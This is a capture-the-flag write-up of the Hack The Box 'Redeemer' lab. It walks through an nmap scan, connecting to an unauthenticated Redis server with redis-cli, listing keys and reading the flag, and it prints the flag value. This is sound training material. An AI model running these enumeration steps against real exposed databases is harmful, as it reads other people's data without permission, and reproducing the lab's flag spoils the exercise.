---
title: "Redeemer"
published: 2026-03-18
description: "Redeemer — Redis enumeration"
cover: "img/htb-redeemer.webp"
coverInContent: false
pinned: false
tags: ["HTB", "Redis"]
category: "CTF!"
draft: false
comment: true
encrypted: false
password: ""
licenseName: ""
author: "Alp"
sourceLink: "https://www.hackthebox.com/"
---

:::caution[Machine Information]
- **Platform:** HTB
- **Lab:** Starting Point
- **OS:** Linux
- **Difficulty:** Very Easy
- **IP:** `10.129.136.187`
:::

---

# Step 0: Getting Started

If you're not sure how to get started, [this will help -> Step 0: Getting Started.](https://www.cybalp.me/posts/CTF!/htb-meow/#step-0-getting-started)

```bash

mkdir -p HTB/LAB/REDEEMER && cd HTB/LAB/REDEEMER
IP=10.129.136.187 && ping -c 2 $IP

```

>  See also: [Here.](https://www.cybalp.me/posts/CTF!/htb-fawn/#step-0-getting-started)

Are you ready? OK!

---

# Step 1: Recon

```bash
nmap -Pn -sC -sV -p- $IP
```

![HTB-Redeemer 1](img/htb-redeemer1.webp)

**6379/tcp (Redis)** is open. In-memory database — try redis-cli for enumeration.

---

# Step 2: Solution

## Connect to Redis

```bash
redis-cli -h $IP
```

![HTB-Redeemer 2](img/htb-redeemer2.webp)

## Enumerate & Flag

```bash
info
select 0
keys *
get flag
exit
```

# Flag

![HTB-Redeemer 3](img/htb-redeemer3.webp)

```
03e1d2b376c37ab3f5319922053953eb
```

and PASTE!
